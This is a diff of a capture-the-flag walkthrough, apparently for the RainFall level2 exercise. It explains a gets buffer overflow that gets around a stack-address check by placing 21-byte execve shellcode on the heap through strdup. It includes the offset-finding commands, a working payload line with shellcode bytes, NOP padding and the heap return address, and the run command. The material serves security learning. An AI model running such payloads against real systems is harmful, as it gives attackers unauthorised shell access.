@@ -1,6 +1,4 @@
-As for the previous level, we have a call to gets which is vulnerable to buffer overflow attacks. But this time, a check is made to make sure that the return of the function does not point to an address in the stack (0xb0000000). However, there is a call to strdup which records the user's input on the heap and which we can exploit.
-
-!!! PRÉCISER CE POINT !!!
+As for the previous level, we have a call to gets which is vulnerable to buffer overflow attacks. But this time, a check is made to make sure that the return of the function does not point to an address in the stack (using the 0xb0000000 mask). However, there is a call to strdup which records the user's input on the heap and which we can exploit.
 
 The address space layout randomization (ASLR) is off, meaning the memory addresses associated with running processes are predictable:
 ```
@@ -17,8 +15,8 @@ puts("ok")                                                            = 3
 strdup("ok")                                                          = 0x0804a008
 +++ exited (status 8) +++
 ```
-
-Using gdb, we find that there are 80 bytes needed to reach the return address:
+<br />
+Now Using gdb, we find that there are 80 bytes needed to reach the return address:
 ```
 python -c "print 'A' * 80 + 'ABCD'" > /tmp/exploit
 ```
@@ -31,12 +29,12 @@ Program received signal SIGSEGV, Segmentation fault.
 0x44434241 in ?? ()
 ```
 
-Now we just have to write or find a shellcode. On [this website](https://shell-storm.org/shellcode/), we find a lot of ready-to-use shellcodes. [this one](https://github.com/maxisimo/42-RainFall/blob/main/level2/walkthrough.md) corresponds to what we want to do. It is 21 bytes long so we need to complete our input with 59 '\x90' bytes (the 'No Operation' instruction), followed by the address of our shellcode on the heap, in the little endian convention:
+Now we just have to write or find a shellcode. On [this website](https://shell-storm.org/shellcode/), we find a lot of ready-to-use shellcodes. [this one](https://shell-storm.org/shellcode/files/shellcode-841.php) corresponds to what we want to do. It is 21 bytes long so we need to complete our input with 59 '\x90' bytes (the 'No Operation' instruction), followed by the address of our shellcode on the heap, in the little endian convention:
 ```
 level2@RainFall:~$ python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x90' * 59 + '\x08\xa0\x04\x08'" > /tmp/exploit
 ```
-
-We just have to launch the program by passing our crafted input:
+<br />
+Finally, we just have to launch the program by passing our crafted input:
 ```
 level2@RainFall:~$ cat /tmp/exploit - | ./level2 
 1���
